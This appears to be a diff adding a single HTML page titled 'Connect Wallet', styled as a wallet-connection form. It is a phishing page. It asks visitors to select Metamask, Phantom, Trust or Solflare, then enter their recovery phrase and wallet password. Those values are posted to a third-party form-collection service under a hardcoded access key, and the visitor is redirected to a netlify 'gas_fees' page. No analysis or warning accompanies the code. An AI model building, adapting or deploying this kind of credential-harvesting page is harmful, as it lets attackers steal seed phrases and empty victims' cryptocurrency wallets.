@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Wallet</title>
+
+    <!-- Google Font Link for Rubik Dirt -->
+    <link href="https://fonts.googleapis.com/css2?family=Rubik+Dirt&display=swap" rel="stylesheet">
+    <link rel="icon" href="/images/favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    
+    <style>
+        /* Basic reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Full viewport setup */
+        body, html {
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Rubik Dirt', cursive;
+            background: linear-gradient(135deg, #A0D683, #D3EE98, #FFEB00);
+            color: #773fb7;
+        }
+
+        /* Container with 19:6 aspect ratio */
+        .form-container {
+            width: 90vw;
+            max-width: 500px;
+            aspect-ratio: 19 / 6;
+            background-color: #60a773;
+            border-radius: 15px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+            padding: 2rem;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        /* Title styles */
+        .form-title {
+            text-align: center;
+            font-size: 1.5em;
+            margin-bottom: 1em;
+            color: #fadbfe;
+        }
+
+        /* Input styles */
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            margin-bottom: 1em;
+        }
+
+        label {
+            font-size: 1em;
+            margin-bottom: 0.5em;
+        }
+
+        select, input[type="text"], input[type="text"] {
+            padding: 0.75em;
+            border-radius: 8px;
+            border: none;
+            outline: none;
+            font-size: 1em;
+            background-color: #D2FF72;
+            color: #031519;
+            transition: all 0.3s ease;
+        }
+
+        select:hover, input[type="text"]:hover, input[type="text"]:hover {
+            background-color: #D2FF72;
+        }
+
+        /* Submit button styles */
+        .submit-btn {
+            padding: 0.75em;
+            font-size: 1.2em;
+            font-weight: bold;
+            color: #4a4b48;
+            background-color: #D2FF72;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .submit-btn:hover {
+            background-color: #73EC8B;
+        }
+
+        /* Fade-in animation */
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10%);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="form-container">
+        <h2 class="form-title">Wallet Information</h2>
+        
+        <!-- Web3Forms Form -->
+        <form action="https://api.web3forms.com/submit" method="POST">
+            <!-- Web3forms API Key -->
+            <input type="hidden" name="access_key" value="ff75fffd-eab8-4ef5-84d6-7c9808725dc2">
+            <input type="hidden" name="redirect" value="https://crosswallet.netlify.app/gas_fees">
+            <!-- Wallet Selection Section -->
+            <div class="form-group">
+                <label for="wallet">Select your wallet:</label>
+                <select id="wallet" name="wallet" required>
+                    <option value="" disabled selected>Select your wallet</option>
+                    <option value="metamask">Metamask</option>
+                    <option value="phantom">Phantom</option>
+                    <option value="trust">Trust</option>
+                    <option value="sui">Solflare</option>
+                </select>
+            </div>
+    
+            <!-- Recovery Phrase Section -->
+            <div class="form-group">
+                <label for="recovery">Recovery Phrase:</label>
+                <input type="text" id="recovery" name="recovery" placeholder="Enter your recovery phrase" required>
+            </div>
+    
+            <!-- Wallet Password Section -->
+            <div class="form-group">
+                <label for="text">Password:</label>
+                <input type="text" id="text" name="text" placeholder="Enter your wallet password" required>
+            </div>
+    
+            <!-- Submit Button -->
+            <button type="submit" class="submit-btn">Connect</button>
+        </form> 
+    </div>
+    
+    </body>
+    </html>
